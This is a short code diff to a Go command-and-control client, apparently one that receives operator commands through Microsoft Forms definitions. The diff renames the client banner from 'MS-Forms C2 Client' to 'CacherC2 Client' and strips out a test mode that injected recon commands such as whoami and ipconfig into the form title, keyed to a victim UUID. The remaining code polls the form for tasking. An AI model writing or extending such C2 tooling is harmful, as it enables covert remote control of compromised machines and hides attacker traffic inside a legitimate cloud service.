@@ -20,12 +20,11 @@ const (
 
 func main() {
 	pollIntervalFlag := flag.Int("poll-interval", PollIntervalSeconds, "Polling interval in seconds")
-	testModeFlag := flag.Bool("test", false, "Test mode: inject test commands")
 	flag.Parse()
 
 	pollInterval := time.Duration(*pollIntervalFlag) * time.Second
 
-	fmt.Printf("[*] Starting MS-Forms C2 Client\n")
+	fmt.Printf("[*] Starting CacherC2 Client\n")
 	fmt.Printf("[*] Form ID: %s\n", FormID[:min(len(FormID), 20)]+"...")
 	fmt.Printf("[*] Poll Interval: %d seconds\n\n", *pollIntervalFlag)
 
@@ -106,8 +105,6 @@ func main() {
 
 	var lastText string
 	hasSubmitted := false
-	testCycleCount := 0
-	testCommands := []string{"whoami", "ipconfig", "echo teste"}
 
 	for {
 		select {
@@ -115,15 +112,6 @@ func main() {
 			formDef, err := forms.GetFormDefinition(formIdentity)
 			if err != nil {
 				continue
-			}
-
-			if *testModeFlag && hasSubmitted {
-				testCycleCount++
-				if testCycleCount <= len(testCommands) {
-					testCmd := testCommands[testCycleCount-1]
-					formDef.Title = fmt.Sprintf("# [%s] %s", envInfo.UUID, testCmd)
-					fmt.Printf("[TEST] Injecting test command: %s\n", formDef.Title)
-				}
 			}
 
 			questionsByTitle := make(map[string]string)
